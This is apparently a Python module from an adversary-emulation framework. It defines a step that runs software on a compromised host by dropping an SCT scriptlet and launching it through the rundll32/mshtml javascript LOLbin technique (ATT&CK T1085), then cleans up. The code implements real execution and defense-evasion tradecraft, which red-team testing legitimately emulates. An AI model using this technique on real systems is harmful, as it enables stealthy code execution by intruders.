from plugins.adversary.app.operation.operation import Step, OPSoftware, OPProcess, OPRat, OPVar, OPHost, OPFile
from plugins.adversary.app.commands import *
from plugins.adversary.app.custom import *

class Rundll32Execution(Step):
    """    Description:
            This step starts a new process via rundll32.exe.
           Requirements:
            This step only requires the existence of a RAT on a host in order to run.
    """
    display_name = 'rundll32_execution'
    summary = 'Use rundll32 to launch a new process.'
    attack_mapping = [('T1085', 'Execution'), ('T1085', 'Defense Evasion')]
    preconditions = [('rat', OPRat),
                     ('host', OPHost(OPVar('software.host'))),
                     ('software', OPSoftware({'downloaded': True, 'installed': False}))]
    postconditions = [('file_g', OPFile({'host': OPVar('rat.host')})),
                      ('process_g', OPProcess),
                      ('software_g', OPSoftware({'downloaded': True, 'installed': True }))]
    significant_parameters = ['host']

    @staticmethod
    def description(host, software):
        return 'Launching {} via Rundll32 on {}'.format(software.name, host.fqdn)

    @staticmethod
    async def action(operation, rat, host, software, file_g, process_g, software_g):

        async def drop_file(path, contents):
            await operation.drop_file_contents(rat, file_path_dest=path, file_contents=bytes(contents, 'utf-8'))
        async def register_file(path):
            await file_g({'path': path, 'host': rat.host})

        # Prepare destination of SCT file
        destination = (get_temp_folder(host, rat) + '{}.sct'.format(random_string()))

        # Drop SCT file containing command to run
        process = ((software.install_command['process'] + ' ') + software.install_command['args']).replace('\\', '\\\\').replace('"', '\\"')
        with open(os.path.join('plugins', 'adversary', 'filestore', 'rundll.sct'), 'rb') as file:
            dump = file.read()
        await operation.drop_file_contents(rat, file_path_dest=destination, file_contents=dump.replace(b'calc.exe', bytes(process, 'utf-8')))

        # Run RunDLL32/mshtml LOLbin
        cmd = command.CustomCommandLine(['c:\\windows\\system32\\rundll32.exe', 'javascript:"\\..\\mshtml,RunHTMLApplication ";o=GetObject("script:file:///{}");o.Exec();close()'.format(destination.replace('\\', '\\\\'))])
        await cmd.generate(drop_file, register_file)
        await operation.execute_shell_command(rat, cmd, None)

        # Register file, process
        await file_g({'path': destination, 'host': host})
        await process_g({'image_name': software.install_command['process'], 'host': host})

        # Update software_g object
        software.executed = True
        await update_software(software_g, software)

        # Mark as successful
        return True

    @staticmethod
    async def cleanup(cleaner, host, file_g, process_g):
        for file in file_g:
            (await cleaner.delete(file))
        for process in process_g:
            (await cleaner.delete(process))
